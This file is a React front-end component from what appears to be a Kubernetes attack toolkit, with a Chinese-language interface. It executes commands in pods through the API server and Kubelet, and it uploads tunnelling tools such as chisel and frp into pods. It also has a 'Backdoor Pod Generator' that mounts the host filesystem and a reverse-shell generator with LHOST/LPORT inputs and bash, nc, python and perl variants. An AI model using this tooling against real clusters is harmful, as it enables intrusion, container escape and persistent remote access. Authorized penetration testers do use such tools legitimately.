import React, { useState } from 'react';
import { Button, Card, Input, Space, Select, Tag, Typography } from 'antd';
import { api, targetParams, recordTargetStep } from '../services/api';
import ResultView from '../components/ResultView';

const { Text } = Typography;

interface Props { getAuth: () => import('../services/api').AuthConfig; addLog: (msg: string) => void; activeTarget: string | null; }

export default function ExecTab({ getAuth, addLog, activeTarget }: Props) {
  const [result, setResult] = useState<any>(null);
  const [loading, setLoading] = useState(false);
  const [ns, setNs] = useState('default');
  const [pod, setPod] = useState('');
  const [container, setContainer] = useState('');
  const [cmd, setCmd] = useState('id');
  const [lhost, setLhost] = useState('');
  const [lport, setLport] = useState('4444');
  const [shellType, setShellType] = useState('bash-i');
  const [backdoorPod, setBackdoorPod] = useState('backdoor-pod');
  // File upload paths stored in React state
  const [uploadLocalPath, setUploadLocalPath] = useState('');
  const [uploadRemotePath, setUploadRemotePath] = useState('');
  // Pod list cache — persists across exec calls
  const [podListCache, setPodListCache] = useState<any[] | null>(null);

  const run = async (fn: () => Promise<any>, label: string, cachePods?: boolean) => {
    setLoading(true); setResult(null);
    try {
      const r = await fn();
      if (cachePods && r.pods) { setPodListCache(r.pods); }
      // Humanize exit codes in output
      if (r?.output && typeof r.output === 'string') {
        const m = r.output.match(/exit code (\d+)/);
        if (m) {
          const codes: Record<string, string> = {
            '1': '通用错误', '2': '语法错误', '126': '无执行权限', '127': '命令未找到 (容器可能无此工具)',
            '128': '无效退出', '130': 'Ctrl+C 中断', '137': 'SIGKILL (OOM?)', '143': 'SIGTERM',
          };
          const code = m[1];
          const hint = codes[code] || '';
          r._exit_hint = `exit code ${code}${hint ? ': ' + hint : ''}`;
          if (code === '127') r._exit_hint += ' → 试试 which curl; which wget; which ss; ls /bin/';
        }
      }
      setResult(r); addLog(`[+] ${label}`);
      recordTargetStep(activeTarget, {
        phase: 'exec',
        tool: 'exec',
        action: label,
        success: !r?.error,
        summary: r?.error ? `${label} failed: ${r.error}` : `${label} completed`,
        data: r,
        output: r?.output || r?.body,
        error: r?.error,
      }).catch(() => {});
    }
    catch (e) {
      setResult({ error: String(e) }); addLog(`[-] ${label}`);
      recordTargetStep(activeTarget, {
        phase: 'exec',
        tool: 'exec',
        action: label,
        success: false,
        summary: `${label} failed`,
        error: String(e),
      }).catch(() => {});
    }
    finally { setLoading(false); }
  };

  const checkTools = async () => {
    if (!pod) { addLog('[-] 请先选择Pod'); return; }
    run(() => api.exec.apiExec({ ...t, namespace: ns, pod_name: pod, command: 'echo "=== 可用工具 ==="; for c in curl wget nc bash sh python python3 perl ruby php ss netstat ifconfig ip tcpdump nmap base64 chmod tar gzip; do which $c 2>/dev/null && echo "✅ $c" || true; done; echo "---"; echo "=== /bin 目录 ==="; ls /bin/ /usr/bin/ /usr/local/bin/ 2>/dev/null | head -30' }), 'Detect tools');
  };

  const quickCmds = [
    { label: 'id', cmd: 'id' },
    { label: 'env', cmd: 'env' },
    { label: 'ls /', cmd: 'ls -la /' },
    { label: 'ss -tlnp', cmd: 'ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null || cat /proc/net/tcp' },
    { label: 'ps aux', cmd: 'ps aux 2>/dev/null || ps' },
    { label: 'mount', cmd: 'mount | head -20' },
    { label: '探测工具', cmd: 'for c in curl wget nc bash sh python python3; do which $c 2>/dev/null && echo "✅ $c" || true; done' },
  ];

  const reverseShellOptions = [
    { value: 'bash-i', label: 'bash -i' },
    { value: 'bash', label: 'bash -c' },
    { value: 'python', label: 'python' },
    { value: 'perl', label: 'perl' },
    { value: 'nc-mkfifo', label: 'nc mkfifo' },
    { value: 'nc-e', label: 'nc -e' },
    { value: 'php', label: 'php' },
    { value: 'ruby', label: 'ruby' },
    { value: 'lua', label: 'lua' },
    { value: 'curl', label: 'curl' },
  ];

  const selectPod = (podName: string, podNs: string) => {
    setPod(podName);
    setNs(podNs);
  };

  const t = targetParams(getAuth());

  return (
    <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 12 }}>
      <Card title="API服务器执行" size="small">
        <Space direction="vertical" style={{ width: '100%' }}>
          <Space>
            <Input placeholder="命名空间" value={ns} onChange={(e) => setNs(e.target.value)} style={{ width: 100 }} />
            <Input placeholder="Pod (点击下方列表自动填充)" value={pod} onChange={(e) => setPod(e.target.value)} style={{ width: 180 }} />
            <Input placeholder="容器(可选)" value={container} onChange={(e) => setContainer(e.target.value)} style={{ width: 120 }} />
          </Space>
          <Space style={{ width: '100%' }}>
            <Input placeholder="命令 (container可能无netstat/ifconfig)" value={cmd} onChange={(e) => setCmd(e.target.value)} style={{ flex: 1 }} />
            <Button type="primary" onClick={() => run(() => api.exec.apiExec({ ...t, namespace: ns, pod_name: pod, container_name: container, command: cmd }), 'API exec')}>执行</Button>
          </Space>
          {/* Quick commands */}
          <div style={{ display: 'flex', flexWrap: 'wrap', gap: 2 }}>
            {quickCmds.map((qc) => (
              <Button key={qc.label} size="small" type="dashed" style={{ fontSize: 10 }}
                onClick={() => { setCmd(qc.cmd); }}>
                {qc.label}
              </Button>
            ))}
          </div>
          <Space>
            <Button onClick={() => run(() => api.exec.apiListPods({ ...t, namespace: ns }), 'List pods', true)}>列出Pod</Button>
            <Button onClick={() => run(() => api.exec.rbacCheck(t), 'RBAC check')}>RBAC检测</Button>
            <Button onClick={checkTools} disabled={!pod} style={{ color: '#52c41a' }}>🔍 探测可用工具</Button>
          </Space>
          {/* Pod list quick-select */}
          {podListCache && podListCache.length > 0 && (
            <div style={{ maxHeight: 180, overflow: 'auto', marginTop: 4 }}>
              <Text type="secondary" style={{ fontSize: 11 }}>已缓存 {podListCache.length} 个Pod (点击选择):</Text>
              <div style={{ display: 'flex', flexWrap: 'wrap', gap: 4, marginTop: 4 }}>
                {podListCache.slice(0, 50).map((p: any, i: number) => (
                  <Tag key={i} color={pod === p.name && ns === p.namespace ? 'blue' : 'default'}
                    style={{ cursor: 'pointer' }}
                    onClick={() => selectPod(p.name, p.namespace)}>
                    {p.namespace}/{p.name}
                  </Tag>
                ))}
                {podListCache.length > 50 && <Text type="secondary" style={{ fontSize: 11 }}>...还有 {podListCache.length - 50} 个</Text>}
              </div>
            </div>
          )}
        </Space>
      </Card>
      <Card title="Kubelet执行" size="small">
        <Space direction="vertical" style={{ width: '100%' }}>
          <Button onClick={() => run(() => api.exec.kubeletListPods(t), 'List pods via Kubelet')}>列出Pod (Kubelet)</Button>
          <Button onClick={() => run(() => api.exec.kubeletExec({ ...t, namespace: ns, pod_name: pod, command: cmd }), 'Kubelet exec')}>执行 via Kubelet</Button>
        </Space>
      </Card>
      <Card title="文件上传 (kubectl cp)" size="small" style={{ border: '2px solid #52c41a' }}>
        <Space direction="vertical" style={{ width: '100%' }}>
          <Space>
            <Input placeholder="本地文件路径" style={{ width: 200 }}
              onChange={(e) => setUploadLocalPath(e.target.value)} />
            <Input placeholder="Pod内路径 (如 /tmp/chisel)" style={{ width: 180 }}
              onChange={(e) => setUploadRemotePath(e.target.value)} />
          </Space>
          <Space>
            <Button type="primary" onClick={() => {
              if (!uploadLocalPath || !uploadRemotePath) { addLog('[-] 请填写本地和远程路径'); return; }
              if (!pod) { addLog('[-] 请先选择Pod'); return; }
              run(() => api.exec.uploadFile({ ...t, namespace: ns, pod_name: pod, local_path: uploadLocalPath, remote_path: uploadRemotePath }), `Upload to ${pod}`);
            }}>
              上传文件到 Pod
            </Button>
            <Button onClick={() => run(() => api.exec.portForward({ ...t, namespace: ns, pod_name: pod, pod_port: 8080 }), 'Port forward info')}>
              端口转发帮助
            </Button>
          </Space>
          <Text type="secondary" style={{ fontSize: 10 }}>
            将本地文件（如 chisel、frp 代理程序、CDK 二进制）通过 tar+SPDY 协议上传到 Pod。
            上传后到「API服务器执行」中 chmod +x 并运行。
          </Text>
        </Space>
      </Card>
      <Card title="Backdoor Pod Generator" size="small">
        <Space direction="vertical" style={{ width: '100%' }}>
          <Space>
            <Input placeholder="Pod name" value={backdoorPod} onChange={(e) => setBackdoorPod(e.target.value)} style={{ width: 130 }} />
            <Input placeholder="LHOST" value={lhost} onChange={(e) => setLhost(e.target.value)} style={{ width: 130 }} />
            <Input placeholder="LPORT" value={lport} onChange={(e) => setLport(e.target.value)} style={{ width: 80 }} />
          </Space>
          <Button danger onClick={() => run(() => api.exec.backdoorYAML({ pod_name: backdoorPod, image: 'ubuntu:latest', mount_path: '/mnt', lhost, lport }), 'Gen backdoor YAML')}>生成YAML</Button>
        </Space>
      </Card>
      <Card title="反弹Shell Generator" size="small">
        <Space direction="vertical" style={{ width: '100%' }}>
          <Space>
            <Input placeholder="LHOST" value={lhost} onChange={(e) => setLhost(e.target.value)} style={{ width: 130 }} />
            <Input placeholder="LPORT" value={lport} onChange={(e) => setLport(e.target.value)} style={{ width: 80 }} />
            <Select value={shellType} onChange={setShellType} style={{ width: 100 }}
              options={reverseShellOptions} />
          </Space>
          <Button onClick={() => run(() => api.exec.reverseShell({ lhost, lport, type: shellType }), 'Gen shell')}>生成</Button>
        </Space>
      </Card>
      <Card title="输出" size="small" style={{ gridColumn: '1 / -1' }}>
        <ResultView result={result} loading={loading} emptyHint="点击上方按钮执行命令或生成 YAML" />
      </Card>
    </div>
  );
}
